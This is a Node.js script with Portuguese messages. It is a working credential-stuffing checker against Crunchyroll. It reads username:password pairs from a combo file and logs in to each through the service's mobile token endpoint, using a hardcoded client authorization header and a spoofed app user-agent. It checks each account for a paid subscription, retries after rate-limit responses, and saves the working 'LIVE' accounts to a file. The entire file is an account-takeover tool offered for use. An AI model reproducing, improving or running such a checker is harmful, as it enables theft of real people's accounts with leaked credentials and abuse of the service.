process.noDeprecation = true;
const axios = require('axios');
const fs = require("fs");


async function run() {
try {
txtnum = await fs.readFileSync('./logins.txt', "utf-8")
} catch {
console.log("crie o arquivoo logins.txt e coloque seus logins nele")
}
var jacheck = []

   numeros= txtnum.split("\n")
   
      for(let numero of numeros) {
      numero = removeUrl(numero)
      user = numero.split(":")[0]
      pass = numero.split(":")[1]
      if(!pass) continue
      if(jacheck.includes(numero)) {
      console.log(`\x1b[1;34m${numero} - [❌ LOGIN REPETIDO]\x1b[0m`)
      continue
      }
      jacheck.push(numero)


  await check(user, pass, numero)
 


}
}
run()



async function check(user, pass, numero) {

try {
let token = await axios.post(
  'https://www.crunchyroll.com/auth/v1/token',
  'username='+encodeURIComponent(user)+'&password='+encodeURIComponent(pass)+'&grant_type=password&scope=offline_access&device_id=0&device_name=by%20kauan%20revil&device_type=KAUAN%20REVIL',
  {
    headers: {
      'Host': 'www.crunchyroll.com',
      'authorization': 'Basic bWduZm5wb2h5bDN0eXRsMzl1YjQ6WEtqUUhkY0w4QkFMRG1yZ2NsSkhKU1VzSGR2SlhCaUM=',
      'content-type': 'application/x-www-form-urlencoded',
      'user-agent': 'Crunchyroll/3.74.0 Android/11 okhttp/4.12.0',
    }
  }
);

token = token.data.access_token


let id = await axios.get('https://www.crunchyroll.com/accounts/v1/me', {
  headers: {
    'authorization': 'Bearer ' +token,
    'user-agent': 'Crunchyroll/3.74.0 Android/11 okhttp/4.12.0'
  }
});

id = id.data.external_id

try {
let resp3 = await axios.get('https://www.crunchyroll.com/subs/v1/subscriptions/'+id+'/products', {
  headers: {
    'authorization': 'Bearer ' +token,
    'user-agent': 'Crunchyroll/3.74.0 Android/11 okhttp/4.12.0'
  }
});

if(resp3.data.items.length == 0) {
console.log(`\x1b[1;35m${numero} - [❌ CONTA SEM ASSINATURA]\x1b[0m`)
return true
}

console.log(`\x1b[1;32m${numero} - [✅ LIVE]\x1b[0m`)
try {
lives = await fs.readFileSync('./lives.txt', "utf-8")
} catch {
lives = ""
}

await fs.writeFileSync('./lives.txt', lives + `${numero} - [✅ LIVE]\n`)

} catch {
console.log(`\x1b[1;35m${numero} - [❌  CONTA SEM ASSINATURA(ERRO 2)]\x1b[0m`)
}



} catch(e) {
console.log(`\x1b[1;31m${numero} - [❌ DIE]\x1b[0m`)

if(e.response.status == 429) {
await sleep(2500)
return await check(user, pass, numero)
}
}

await sleep(2500)

return true

}


// OUTRAS FUNÇÕES \\

//remover url
function removeUrl(str) {
  // Expressão regular para identificar URLs e o primeiro ":"
  const urlRegex = /^(https?:\/\/)?[^:]+:/;

  // Verifica se há mais de um ":" na string
  if (str.split(':').length > 2) {
    return str.replace(urlRegex, "")
  }

  return str
}

//sleep
async function sleep (ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}